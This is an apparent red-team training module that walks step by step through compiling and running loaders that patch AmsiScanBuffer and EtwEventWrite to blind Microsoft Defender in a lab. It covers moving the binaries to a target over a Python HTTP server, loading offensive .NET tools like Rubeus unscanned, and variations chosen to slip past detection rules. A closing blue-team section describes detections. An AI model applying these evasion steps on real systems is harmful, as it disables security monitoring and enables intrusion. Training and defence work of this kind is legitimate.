Loader 04 has an optional feature. If you pass a file path as a command-line argument, it loads that .NET assembly into the current process and runs it. Because AMSI is already patched in this process, the loaded assembly will not be scanned by Defender. This lets you run .NET red team tools (like Rubeus, Seatbelt, SharpHound) without AMSI blocking them.

Assembly.LoadFile loads a compiled .NET assembly (.exe or .dll) into the running process. The EntryPoint property finds the Main method of that assembly. Invoke calls the Main method with any extra arguments you passed on the command line.

### The Complete AMSI Bypass Loader

The full source code is at `lab/loaders/04_amsi_bypass.cs`.

## Compilation and Execution

### Step 1: Compile Both Loaders on the Dev Box

On the dev box (ammulu, 192.168.10.150), open the Developer Command Prompt for Visual Studio 2022.

Compile the ETW patch:
```
csc /unsafe /out:etw_patch.exe 07_etw_patch.cs
```

Compile the AMSI bypass:
```
csc /unsafe /out:amsi_bypass.exe 04_amsi_bypass.cs
```

The `/unsafe` flag is needed because both loaders use Marshal.Copy to write to unmanaged memory addresses. Expected output for both: the compiler produces the .exe file with no errors.

### Step 2: Transfer Both Files to the Target

On the dev box (ammulu), host both files:
```
cd C:\Users\ammulu\Desktop
python -m http.server 8080
```

On the target (kimjongun, 192.168.10.100), download both:
```powershell
Invoke-WebRequest -Uri "http://192.168.10.150:8080/etw_patch.exe" -OutFile "C:\Users\kimjongun\Desktop\etw_patch.exe"
Invoke-WebRequest -Uri "http://192.168.10.150:8080/amsi_bypass.exe" -OutFile "C:\Users\kimjongun\Desktop\amsi_bypass.exe"
```

Defender scans both files when they hit the disk. Neither triggers a detection because their import tables are clean and no suspicious strings exist in the binaries.

### Step 3: Run the ETW Patch First

On the target (kimjongun, 192.168.10.100), open a Command Prompt and run:
```
cd C:\Users\kimjongun\Desktop
etw_patch.exe
```

Expected output:
```
[*] Telemetry Patcher
[*] This modifies the event writer to disable logging.

[+] ntdll base address: 0x7FFE12340000
[+] EtwEventWrite at: 0x7FFE12345678
[+] Patch applied to EtwEventWrite
[+] Memory protection restored

[+] Telemetry is now disabled in this process.
[+] No events will be generated by this process.
[+] Monitoring products will not receive data
    about what this process does from this point forward.

[*] You should run the scanner patch (Loader 04) next.
[*] Because telemetry is patched, the scanner patching will not be logged.
```

The actual memory addresses (0x7FFE...) will be different on your system. The important output is the "[+] Patch applied" and "[+] Memory protection restored" lines, which confirm the patch was written and the cleanup was done.

**Remember:** This patch only affects the etw_patch.exe process. Once it exits, the patch is gone. This standalone run is for testing and learning. In a real operation, you would integrate the patch function into your main loader (which is what Loader 08 does in Document 10).

### Step 4: Run the AMSI Bypass

On the target (kimjongun, 192.168.10.100), in a new Command Prompt window:
```
cd C:\Users\kimjongun\Desktop
amsi_bypass.exe
```

Expected output:
```
[*] Scanner Patch Loader
[*] This modifies the scan function to disable content inspection.

[+] amsi.dll loaded at: 0x7FFE98760000
[+] AmsiScanBuffer found at: 0x7FFE98765432
[+] Patch applied to AmsiScanBuffer
[+] Memory protection restored

[+] Scanner is now disabled in this process.
[+] Any commands or assemblies loaded
    in this process will not be inspected.
```

Again, the actual addresses will vary. The key confirmation is that amsi.dll was found, AmsiScanBuffer was located, and the patch was applied.

### Step 5: Test the AMSI Bypass (Optional but Recommended)

To verify that the AMSI patch actually works, you can test it with a PowerShell string that Defender normally blocks. This requires a more complex test setup because the AMSI patch only works in the process that applied it. Running amsi_bypass.exe and then opening a separate PowerShell window does not help because the new PowerShell process has its own unpatched copy of amsi.dll.

The proper way to test is to use the assembly loading feature. If you have a .NET red team tool (a compiled .exe that Defender normally blocks), you can load it through amsi_bypass.exe:

```
amsi_bypass.exe C:\Users\kimjongun\Desktop\some_tool.exe
```

The tool will load and run inside the amsi_bypass.exe process where AMSI is patched, so Defender will not scan it. If you ran the same tool directly (double-clicking it or running it from cmd), AMSI would scan it and potentially block it.

For now, confirming the patch applied without errors is sufficient. Document 10 integrates the AMSI and ETW patches into the combined evasion loader where you will see the full effect.

## Confirming Success

For each loader, confirm three things:

### ETW Patch (Loader 07):
1. **Output shows "[+] Patch applied to EtwEventWrite"** and **"[+] Memory protection restored"**. This confirms the patch was written and cleaned up.
2. **No Defender alerts.** Open Windows Security on the target (kimjongun). Go to Virus & threat protection, then Protection history. There should be no entries for etw_patch.exe.
3. **The process ran to completion without crashing.** If the process crashes after patching, the patch bytes were wrong or the function address was incorrect. A successful patch means EtwEventWrite's code was correctly overwritten and the process continued running normally.

### AMSI Bypass (Loader 04):
1. **Output shows "[+] Patch applied to AmsiScanBuffer"** and **"[+] Memory protection restored"**. Same confirmation as above.
2. **No Defender alerts.** No entries in Protection history for amsi_bypass.exe.
3. **If you loaded a .NET assembly through the loader**, it ran without AMSI blocking it. If the assembly ran and produced output, AMSI was successfully disabled.

### Verification with ETW Logging (Advanced)

If you want to confirm that the ETW patch actually stopped events from being generated, you can check with the built-in Windows logman tool before and after patching. This is optional and not needed for the curriculum, but it confirms the patch works at the system level.

On the target (kimjongun), before running the ETW patch, open a PowerShell window and run:
```powershell
logman query providers | Select-String "Microsoft-Windows-DotNETRuntime"
```

This shows that the .NET ETW provider is registered and active. After the ETW patch is applied (in the same process), events from that process to this provider will stop. The provider is still registered (logman will still show it), but EtwEventWrite in the patched process will not send events to it.

## What Was Gained

After this document, you can:

- Explain what ETW is and why Defender uses it to detect malicious behavior
- Explain what AMSI is and how it scans .NET code and PowerShell commands at runtime
- Patch EtwEventWrite to stop your process from generating telemetry
- Patch AmsiScanBuffer to stop your process from scanning loaded code
- Build function names and DLL names from integer offsets to avoid static signatures
- Build patch bytes from arithmetic to avoid byte-sequence signatures
- Use VirtualProtect to make code memory writable, apply patches, and restore protections
- Understand why ETW must be patched before AMSI (to prevent the AMSI patch from being logged)

Combined with what you learned in previous documents, you have now addressed five of Defender's six detection layers:

| Layer | How it is addressed | Which document/loader |
|---|---|---|
| Static file scanning | XOR encryption of shellcode | Document 06, Loader 02 |
| Import table analysis | Dynamic resolution via GetProcAddress | Document 07, Loader 03 |
| AMSI runtime scanning | Patching AmsiScanBuffer | This document, Loader 04 |
| ETW telemetry | Patching EtwEventWrite | This document, Loader 07 |
| Behavioral ML | Two-step allocation, clean imports | Document 07, Loader 03 |
| API hooks in ntdll.dll | Not yet addressed | Document 09 (partial), Document 10 (combined) |

Document 09 teaches process injection techniques (Loader 05 and Loader 06) that let you execute code inside other processes. Document 10 combines everything into Loader 08, which patches ETW, patches AMSI, and executes shellcode with dynamic resolution in a single binary that survives Defender completely.

## Common Threats and Variations

### Variation 1: Patching AmsiOpenSession Instead of AmsiScanBuffer

AmsiScanBuffer is the most commonly patched function, and because of that, some security products specifically watch for modifications to it. An alternative target is AmsiOpenSession, which is the function that initializes an AMSI scanning session. If you patch AmsiOpenSession to return an error, no scanning session is ever opened, so AmsiScanBuffer is never called.

The patch bytes are similar: set EAX to an error code and return. The difference is that you target a different function address. Some red team tools use AmsiOpenSession patching because fewer detection rules target it compared to AmsiScanBuffer.

When this variation would fail: if a security product monitors both functions for modifications, patching either one triggers detection.

### Variation 2: Overwriting the AMSI Context Structure

Instead of patching the function code, you can corrupt the AMSI context structure in memory. Every AMSI-enabled process has a context object (AMSI_CONTEXT) that stores the state of the AMSI interface. If you overwrite the context with invalid data, every call to AmsiScanBuffer fails because the context it receives is corrupted. The function returns an error without scanning.

The benefit is that you are not modifying executable code, which is what most integrity checks look for. You are modifying a data structure, which is harder to detect. The downside is that the context structure's layout can change between Windows updates, so the offset you need to corrupt may differ.

### Variation 3: Patching ETW via NtTraceEvent Instead of EtwEventWrite

EtwEventWrite is the high-level ETW function in ntdll.dll. Under it, there is a lower-level function called NtTraceEvent that actually performs the kernel transition. Patching NtTraceEvent instead of EtwEventWrite covers more ground because there are other ETW functions (EtwEventWriteEx, EtwEventWriteFull, EtwEventWriteTransfer) that all go through NtTraceEvent. Patching at the NtTraceEvent level disables all of them.

The risk is that NtTraceEvent is a lower-level function that is used by more components. Patching it could cause stability issues in some processes that rely on ETW for their own internal logging (not security-related).

## Detection and Defense (Blue Team Perspective)

**Monitor for VirtualProtect calls on system DLL code sections.** When a process calls VirtualProtect on a memory region that belongs to ntdll.dll or amsi.dll, that is a strong signal of function patching. Legitimate programs almost never modify system DLL code in their own process.

Blue team action: configure your EDR to alert when VirtualProtect is called with a target address inside ntdll.dll or amsi.dll and the new protection includes write permissions (PAGE_READWRITE or PAGE_EXECUTE_READWRITE).

**Verify AMSI integrity at runtime.** Microsoft provides the AmsiInitialize API that security products can call to verify that the AMSI interface is working correctly. A security product can periodically call AmsiScanBuffer with a known-malicious test string (the EICAR test string) and check that the result is "malicious". If the result is "clean" or an error, AMSI has been tampered with.

Blue team action: deploy an agent that periodically tests AMSI functionality in running processes. If AMSI stops detecting the test string in a process, flag that process for investigation.

**Use kernel-mode ETW providers.** The user-mode EtwEventWrite patch does not affect kernel-mode ETW providers. The Microsoft-Windows-Threat-Intelligence provider runs in the kernel and logs events like process creation, image loads, and virtual memory operations from kernel space. These events cannot be suppressed from user mode.

Blue team action: deploy EDR products that consume kernel-mode ETW events (via the Threat Intelligence provider) rather than relying solely on user-mode telemetry. This defeats the user-mode ETW patch.

**Compare ntdll.dll in memory against the on-disk copy.** Defender and some EDR products periodically compare the loaded copy of ntdll.dll in a process against the file on disk. If the in-memory copy has been modified (bytes differ from the disk copy), the process is flagged. This technique catches both the ETW and AMSI patches.

Blue team action: enable or deploy DLL integrity checking that compares in-memory DLL code sections against the on-disk originals. Alert on any differences in ntdll.dll or amsi.dll.

## What Comes Next

Document 09 (lab/materials/09_reflective_injection.md) teaches process injection. Loader 05 (reflective DLL injector) and Loader 06 (Early Bird APC injection) let you execute code inside another process's memory space. These techniques let your malicious code run under the identity of a legitimate process (like explorer.exe or svchost.exe), which makes it harder for Defender to distinguish your code from legitimate process behavior. Document 09 covers techniques that Defender catches when used alone, but that become powerful when combined with the patches from this document.
